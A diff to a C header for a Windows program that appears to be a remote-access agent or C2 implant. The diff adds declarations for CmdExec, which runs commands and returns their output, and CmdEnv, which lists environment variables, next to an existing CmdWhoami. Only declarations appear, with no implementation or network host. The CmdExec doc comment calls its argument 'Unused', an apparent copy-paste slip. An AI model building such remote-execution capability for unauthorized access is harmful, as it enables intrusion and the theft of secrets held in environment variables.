@@ -1,6 +1,9 @@
 #pragma once
-#include <Windows.h>
-
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN //claude 
+#endif
+#include <windows.h>
+#include <winsock2.h>
 #include "debug.h"
 #include "error.h"
 #include "generated_commands.h"
@@ -302,4 +305,36 @@ DWORD CmdWhoami(
 	DWORD* responseLen
 );
 
+/**
+ * @brief execute a program or command and return output, exit status, or error information
+ *
+ * @param dataLen The command argument length in bytes. Unused.
+ * @param data The command argument buffer. Unused.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdExec(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
 
+/**
+ * @brief  list all environment variables for the current process
+ *
+ * @param dataLen The command argument length in bytes. Unused.
+ * @param data The command argument buffer. Unused.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdEnv(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
